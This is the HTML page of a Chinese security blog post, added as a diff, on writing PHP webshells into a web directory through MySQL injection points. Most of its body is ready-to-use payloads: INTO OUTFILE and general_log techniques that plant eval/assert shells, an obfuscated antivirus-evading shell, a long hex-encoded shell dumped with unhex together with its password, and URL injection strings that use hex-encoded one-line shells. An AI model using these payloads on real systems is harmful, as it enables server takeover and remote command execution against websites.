@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言通过mysql插入一条php代码记录输出到http服务器工作目录下，通过url传参来交给php系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录 可以先查看一下mysql的能写的文件 secure_file_priv 1234show global variables like &#39;%secure%&#39;;secure_file_priv的值为null，表">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySql注入点写webshell">
+<meta property="og:url" content="http://140.143.122.13/posts/23798.html">
+<meta property="og:site_name" content="忆时光">
+<meta property="og:description" content="前言通过mysql插入一条php代码记录输出到http服务器工作目录下，通过url传参来交给php系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录 可以先查看一下mysql的能写的文件 secure_file_priv 1234show global variables like &#39;%secure%&#39;;secure_file_priv的值为null，表">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-29T11:27:37.000Z">
+<meta property="article:modified_time" content="2020-04-29T13:11:41.269Z">
+<meta property="article:author" content="ca5tle">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="MySql">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>MySql注入点写webshell</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="忆时光" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/63039.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/39451.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/23798.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/23798.html&text=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/23798.html&is_video=false&description=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MySql注入点写webshell&body=Check out this article: http://140.143.122.13/posts/23798.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/23798.html&name=MySql注入点写webshell&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/23798.html&t=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select-…-into-outfile"><span class="toc-number">2.</span> <span class="toc-text">select … into outfile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用条件"><span class="toc-number">2.1.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势"><span class="toc-number">2.2.</span> <span class="toc-text">姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#general-log"><span class="toc-number">3.</span> <span class="toc-text">general_log</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用条件-1"><span class="toc-number">3.1.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势-1"><span class="toc-number">3.2.</span> <span class="toc-text">姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用方式"><span class="toc-number">3.2.1.</span> <span class="toc-text">常用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#免杀shell"><span class="toc-number">3.2.2.</span> <span class="toc-text">免杀shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用分隔符写shell"><span class="toc-number">4.</span> <span class="toc-text">利用分隔符写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用要求"><span class="toc-number">4.1.</span> <span class="toc-text">使用要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势-2"><span class="toc-number">4.2.</span> <span class="toc-text">姿势</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        MySql注入点写webshell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ca5tle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-29T11:27:37.000Z" itemprop="datePublished">2020-04-29</time>
+        
+        (Updated: <time datetime="2020-04-29T13:11:41.269Z" itemprop="dateModified">2020-04-29</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WEB/">WEB</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/MySql/" rel="tag">MySql</a>, <a class="tag-link" href="/tags/webshell/" rel="tag">webshell</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<code>mysql</code>插入一条<code>php</code>代码记录输出到<code>http</code>服务器工作目录下，通过<code>url</code>传参来交给<code>php</code>系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录</p>
+<p>可以先查看一下<code>mysql</code>的能写的文件 <code>secure_file_priv</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br><span class="line">secure_file_priv的值为null，表示限制mysqld不允许导入&#x2F;导出</span><br><span class="line">secure_file_priv的值为D:&#x2F;，表示限制mysqld的导入&#x2F;导出只能发生在D盘目录下</span><br><span class="line">secure_file_priv没有具体值时，表示不对mysqld的导入&#x2F;导出做限制</span><br></pre></td></tr></table></figure>
+
+<h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
+<li>对<code>web</code>目录有写权限</li>
+<li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li>
+<li>有绝对路径(读文件可以不用，写文件需要)</li>
+<li>没有配置<code>secure-file-priv</code></li>
+</ul>
+<h3 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h3><ul>
+<li>有<code>union</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php assert($_POST["cmd"]); ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/home/wwwroot/default/shell.php'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无<code>union</code></li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">into outfile '/home/wwwroot/default/shell.php' fields terminated by '&lt;?php assert($_POST["cmd"]);?&gt;'</span><br></pre></td></tr></table></figure>
+
+<h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p>
+<h3 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
+<li>对<code>web</code>目录有写权限</li>
+<li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li>
+<li>有绝对路径(读文件可以不用，写文件需要)</li>
+<li>需要能执行多行SQL语句</li>
+</ul>
+<h3 id="姿势-1"><a href="#姿势-1" class="headerlink" title="姿势"></a>姿势</h3><h4 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;             <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;                 <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'E:/study/WWW/evil.php'</span>; <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_GET[g]);?&gt;'</span>             <span class="comment">#写入shell</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">off</span>;                  <span class="comment">#关闭general log模式</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="免杀shell"><a href="#免杀shell" class="headerlink" title="免杀shell"></a>免杀shell</h4><p>一句话webshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['cmd']));?&gt;"</span></span><br></pre></td></tr></table></figure>
+
+<p>创建数据表，写入webshell后删除数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`mysql`</span>.<span class="string">`antian365`</span> (<span class="string">`temp`</span> <span class="built_in">TEXT</span> <span class="keyword">NOTNULL</span> );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`mysql`</span>.<span class="string">`antian365`</span> (<span class="string">`temp`</span> ) <span class="keyword">VALUES</span>(<span class="string">'&lt;?php @eval($_POST[antian365]);?&gt;'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">`temp`</span> <span class="keyword">FROM</span> <span class="string">`antian365`</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span><span class="string">'D:/www/antian365.php'</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`antian365`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>select unhex(‘十六进制字符串’) into dumpfile file_path，密码==&gt;pp64mqa2x1rnw68</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="string">'203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/WEB/IPTEST/22.php'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用分隔符写shell"><a href="#利用分隔符写shell" class="headerlink" title="利用分隔符写shell"></a>利用分隔符写shell</h2><p>当MySQL注入点为盲注或报错，<code>union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>Sqlmap</code>的<code>--os-shell</code>命令所采用的就是这种方式。</p>
+<h3 id="使用要求"><a href="#使用要求" class="headerlink" title="使用要求"></a>使用要求</h3><ul>
+<li><code>secure_file_priv</code>支持<code>web</code>目录文件导出</li>
+<li>对<code>web</code>目录有写权限</li>
+<li>有绝对路径</li>
+</ul>
+<h3 id="姿势-2"><a href="#姿势-2" class="headerlink" title="姿势"></a>姿势</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 LIMIT 0,1 INTO OUTFILE &#39;E:&#x2F;study&#x2F;WWW&#x2F;evil.php&#39; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e27 --</span><br></pre></td></tr></table></figure>
+
+<p>同样的技巧，一共有四种形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; lines terminated by  （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; fields terminated by （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; columns terminated by （一句话hex编码）#</span><br><span class="line">?id&#x3D;1 INTO OUTFILE &#39;绝对路径&#39; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'euAQjqlW2tS4fVHxsmyLkdLj-gzGzoHsz',
+            appKey: 'Fmn6CIIN9yyDif6AC2hxSglA',
+            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+            avatar: 'robohash'
+        })
+    </script>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select-…-into-outfile"><span class="toc-number">2.</span> <span class="toc-text">select … into outfile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用条件"><span class="toc-number">2.1.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势"><span class="toc-number">2.2.</span> <span class="toc-text">姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#general-log"><span class="toc-number">3.</span> <span class="toc-text">general_log</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用条件-1"><span class="toc-number">3.1.</span> <span class="toc-text">使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势-1"><span class="toc-number">3.2.</span> <span class="toc-text">姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用方式"><span class="toc-number">3.2.1.</span> <span class="toc-text">常用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#免杀shell"><span class="toc-number">3.2.2.</span> <span class="toc-text">免杀shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用分隔符写shell"><span class="toc-number">4.</span> <span class="toc-text">利用分隔符写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用要求"><span class="toc-number">4.1.</span> <span class="toc-text">使用要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#姿势-2"><span class="toc-number">4.2.</span> <span class="toc-text">姿势</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://140.143.122.13/posts/23798.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://140.143.122.13/posts/23798.html&text=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://140.143.122.13/posts/23798.html&is_video=false&description=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MySql注入点写webshell&body=Check out this article: http://140.143.122.13/posts/23798.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://140.143.122.13/posts/23798.html&title=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://140.143.122.13/posts/23798.html&name=MySql注入点写webshell&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://140.143.122.13/posts/23798.html&t=MySql注入点写webshell" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2020
+    ca5tle
+	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">你自己的备案号</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://www.sectime.top:8888" target="_blank" rel="noopener">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
